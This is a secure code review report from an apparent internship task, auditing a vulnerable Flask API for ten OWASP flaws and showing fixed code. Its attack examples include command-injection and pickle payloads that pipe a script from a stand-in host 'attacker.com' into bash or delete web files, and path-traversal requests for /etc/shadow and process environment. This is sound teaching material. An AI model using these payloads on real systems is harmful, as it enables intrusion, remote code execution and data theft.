# Secure Code Review Report
## CodeAlpha Cybersecurity Internship — Task 3

---

| Field | Detail |
|---|---|
| **Author** | Hiruni Ranasinghe |
| **GitHub** | https://github.com/hiruranasinghe |
| **Repository** | CodeAlpha_SecureCodingReview |
| **Application** | vulnerable_app.py — Python Flask REST API |
| **Language** | Python 3.x · Flask Framework |
| **Review Method** | Manual Inspection + Static Analysis (Bandit) |
| **Standard** | OWASP Top 10 (2021) |

---

## Executive Summary

A full security audit of the target Flask web application identified
**10 vulnerabilities** across 7 endpoints. Findings range from Critical
Remote Code Execution risks to Medium severity data exposure issues.
All vulnerabilities have been remediated in `secure_app.py`.

---

## Vulnerability Overview

| ID | Vulnerability | Severity | OWASP Category | Status |
|---|---|---|---|---|
| VULN-01 | Hardcoded Secret Key | 🔴 Critical | A02 Cryptographic Failure | ✅ Fixed |
| VULN-02 | SQL Injection — Login | 🔴 Critical | A03 Injection | ✅ Fixed |
| VULN-03 | Broken Access Control | 🔴 Critical | A01 Broken Access Control | ✅ Fixed |
| VULN-04 | SQL Injection — Search | 🟠 High | A03 Injection | ✅ Fixed |
| VULN-05 | Sensitive Data Exposure | 🟠 High | A02 Cryptographic Failure | ✅ Fixed |
| VULN-06 | OS Command Injection | 🟠 High | A03 Injection | ✅ Fixed |
| VULN-07 | Plaintext Passwords | 🟠 High | A02 Cryptographic Failure | ✅ Fixed |
| VULN-08 | Insecure Deserialization | 🟠 High | A08 Integrity Failure | ✅ Fixed |
| VULN-09 | Path Traversal | 🟡 Medium | A01 Broken Access Control | ✅ Fixed |
| VULN-10 | Predictable Reset Token | 🟡 Medium | A07 Auth Failure | ✅ Fixed |

---

## Detailed Findings

---

### VULN-01 - Hardcoded Secret Key
**Severity:** 🔴 Critical | **OWASP:** A02 Cryptographic Failures

**What is wrong:**
The Flask `secret_key` is hardcoded as a simple string in the source
code. Flask uses this key to sign and verify session cookies.
Anyone who reads the code (or git history) can forge valid session
cookies and impersonate any user — including administrators.

**Vulnerable code:**
```python
app.secret_key = "supersecret123"
```

**Attack scenario:**
```python
# Attacker reads source code, finds the key
# Forges a session cookie claiming to be admin
# Gets full admin access with zero credentials
```

**Fixed code:**
```python
import os, secrets
app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
```

**Key lesson:** Never hardcode secrets. Load from environment variables
or a secrets manager (AWS Secrets Manager, HashiCorp Vault).

---

### VULN-02 — SQL Injection (Login Endpoint)
**Severity:** 🔴 Critical | **OWASP:** A03 Injection

**What is wrong:**
User-supplied username and password are pasted directly into the SQL
query string using an f-string. An attacker can break out of the
string and change the logic of the query entirely.

**Vulnerable code:**
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**Attack — bypass login completely:**
```
username: admin'--
password: anything
```
Resulting query:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```
The `--` comments out the password check. Attacker logs in as admin
with no password at all.

**Fixed code:**
```python
# ? placeholder — database handles escaping, injection impossible
user = conn.execute(
    "SELECT * FROM users WHERE username = ?", (username,)
).fetchone()
if user and bcrypt.checkpw(password, user["password_hash"].encode()):
    ...
```

**Key lesson:** Always use parameterised queries. Never use string
formatting or concatenation to build SQL queries.

---

### VULN-03 — Broken Access Control
**Severity:** 🔴 Critical | **OWASP:** A01 Broken Access Control

**What is wrong:**
The `/admin/search` endpoint has absolutely no authentication check.
Any person on the internet can call it without logging in and get
a full list of all users.

**Vulnerable code:**
```python
@app.route("/admin/search")
def admin_search():
    # No login check - wide open to anyone
    query = request.args.get("q", "")
```

**Fixed code:**
```python
@app.route("/admin/search")
@login_required      # must be logged in
@admin_required      # must have admin role
def admin_search():
```

**Key lesson:** Every sensitive endpoint must verify both
authentication (who are you?) and authorisation (are you allowed?).

---

### VULN-04 — SQL Injection (Admin Search)
**Severity:** 🟠 High | **OWASP:** A03 Injection

**What is wrong:**
Same root cause as VULN-02. The search query parameter goes straight
into the SQL LIKE clause without sanitisation.

**Vulnerable code:**
```python
f"SELECT * FROM users WHERE username LIKE '%{query}%'"
```

**Fixed code:**
```python
conn.execute(
    "SELECT id, username, email, role FROM users WHERE username LIKE ?",
    (f"%{query}%",)
)
```

---

### VULN-05 — Sensitive Data Exposure
**Severity:** 🟠 High | **OWASP:** A02 Cryptographic Failures

**What is wrong:**
    The admin search API returns every column from the users table -
including the password field — directly in the JSON response.
Even hashed passwords in a response enable offline cracking attacks.

**Vulnerable code:**
```python
return jsonify(results)  # returns ALL columns including password
```

**Fixed code:**
```python
# Explicitly name only the safe columns
rows = conn.execute(
    "SELECT id, username, email, role FROM users WHERE username LIKE ?", ...
)
```

**Key lesson:** Always apply the principle of minimum data exposure.
Never return more data than is absolutely necessary.

---

### VULN-06 — OS Command Injection
**Severity:** 🟠 High | **OWASP:** A03 Injection

**What is wrong:**
User input is joined directly into a shell command string and
executed with `shell=True`. An attacker appends shell metacharacters
to run any operating system command on the server.

**Vulnerable code:**
```python
output = subprocess.check_output(f"ping -c 1 {host}", shell=True)
```

**Attack examples:**
```
GET /diagnostics?host=127.0.0.1; cat /etc/passwd
GET /diagnostics?host=127.0.0.1; curl attacker.com/shell.sh | bash
GET /diagnostics?host=127.0.0.1; rm -rf /var/www/
```

**Fixed code:**
```python
# Step 1 — Validate input strictly with regex allowlist
if not re.match(r'^[a-zA-Z0-9.\-]{1,253}$', host):
    return jsonify({"error": "Invalid host"}), 400

# Step 2 - Pass as list, never shell=True
result = subprocess.run(
    ["ping", "-c", "1", host],
    capture_output=True, text=True, timeout=5
)
```

**Key lesson:** Never use `shell=True` with any user-influenced data.
Always pass arguments as a list. Always validate with an allowlist.

---

### VULN-07 - Plaintext Password Storage
**Severity:** 🟠 High | **OWASP:** A02 Cryptographic Failures

**What is wrong:**
Passwords are stored as plain text strings in the database.
If the database file is ever stolen or leaked every single user's
password is immediately readable with no effort at all.

**Vulnerable code:**
```python
conn.execute(f"UPDATE users SET password='{new_password}' WHERE ...")
```

**Fixed code:**
```python
import bcrypt

hashed = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt())
conn.execute(
    "UPDATE users SET password_hash = ? WHERE username = ?",
    (hashed.decode(), session["user"])
)
```

**Key lesson:** Always hash passwords with a slow, salted algorithm.
Use **bcrypt**, **scrypt**, or **Argon2id**. Never use MD5 or SHA-256
for passwords — they are far too fast to crack.

---

### VULN-08 — Insecure Deserialization (RCE)
**Severity:** 🟠 High | **OWASP:** A08 Software Integrity Failures

**What is wrong:**
Python's `pickle.loads()` executes arbitrary code during
deserialization. Passing user-supplied data to `pickle.loads()`
gives the attacker full Remote Code Execution on the server.

**Vulnerable code:**
```python
obj = pickle.loads(base64.b64decode(data))
```

**Attack — execute any command on the server:**
```python
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# POST /restore-session with session_data=<payload>
# → server executes the attacker's command
```

**Fixed code:**
```python
# Removed pickle entirely — only accept typed JSON with an allowlist
data        = request.get_json(silent=True) or {}
allowed     = {"theme", "language", "timezone"}
preferences = {k: str(v)[:64] for k, v in data.items() if k in allowed}
```

**Key lesson:** Never deserialise user-supplied data with pickle,
marshal, or yaml.load() (unsafe). Use JSON with strict field validation.

---

### VULN-09 — Path Traversal
**Severity:** 🟡 Medium | **OWASP:** A01 Broken Access Control

**What is wrong:**
The filename from the URL is joined to a directory path without
any sanitisation. The attacker uses `../` sequences to escape the
intended directory and read any file on the entire server.

**Vulnerable code:**
```python
filename = request.args.get("file", "app.log")
log_path = os.path.join("/var/log/app/", filename)
with open(log_path) as f:
    return f.read()
```

**Attack examples:**
```
GET /logs?file=../../etc/passwd        → all system users
GET /logs?file=../../etc/shadow        → hashed passwords
GET /logs?file=../../proc/self/environ → environment variables + SECRET_KEY
```

**Fixed code:**
```python
ALLOWED_LOG_DIR = os.path.realpath("/var/log/app/")

requested = os.path.realpath(os.path.join(ALLOWED_LOG_DIR, filename))

# Verify the resolved path is still inside the allowed directory
if not requested.startswith(ALLOWED_LOG_DIR + os.sep):
    return jsonify({"error": "Access denied"}), 403
```

**Key lesson:** Always use `os.path.realpath()` to resolve `..`
sequences and symlinks. Then verify the result starts with your
intended base directory.

---

### VULN-10 — Predictable Password Reset Token
**Severity:** 🟡 Medium | **OWASP:** A07 Identification & Auth Failures

**What is wrong:**
The password reset token is simply `md5(username)`. MD5 is a fast,
deterministic hash — any attacker who knows a username can compute
the reset token themselves in milliseconds and hijack any account.

**Vulnerable code:**
```python
expected = hashlib.md5(username.encode()).hexdigest()
# md5("admin") = 21232f297a57a5a743894a0e4a801fc3 — always the same
```

**Attack:**
```python
import hashlib
token = hashlib.md5(b"admin").hexdigest()
# GET /reset-password?token=21232f297a57a5a743894a0e4a801fc3&user=admin
# → instant account takeover
```

**Fixed code:**
```python
import secrets, time

token      = secrets.token_urlsafe(32)   # 256 bits of randomness
expires_at = time.time() + 3600          # expires in 1 hour

# Store in database, delete after one use
# Send ONLY to the user's registered email — never return in response
```

**Key lesson:** Reset tokens must be cryptographically random,
time-limited, single-use, and delivered only to the account owner.

---

## Secure Coding Principles Applied

| Principle | How It Was Applied |
|---|---|
| **Input Validation** | Regex allowlist on all user-supplied values |
| **Parameterised Queries** | `?` placeholders in every SQL statement |
| **Least Privilege** | Role-based decorators; minimal DB columns returned |
| **Secure Defaults** | `debug=False`, `SECURE` cookies, `SAMESITE` policy |
| **Strong Cryptography** | bcrypt for passwords, `secrets` module for tokens |
| **Defence in Depth** | Multiple controls per endpoint, not relying on one check |
| **Fail Securely** | Generic error messages that don't reveal system details |

---

## Tools Used

| Tool | Purpose | Command |
|---|---|---|
| **Bandit** | Python static analyser | `pip install bandit` → `bandit -r vulnerable_app.py` |
| **Manual Review** | Business logic & auth flaws | Line by line inspection |
| **OWASP Top 10** | Vulnerability checklist | https://owasp.org/Top10/ |

---

## References

- OWASP Top 10 (2021): https://owasp.org/Top10/
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- Python Bandit Docs: https://bandit.readthedocs.io/
- NIST Password Guidelines SP 800-63B

---

*CodeAlpha Cybersecurity Internship — Task 3: Secure Coding Review*
*Author: Hiruni Ranasinghe | https://github.com/hiruranasinghe*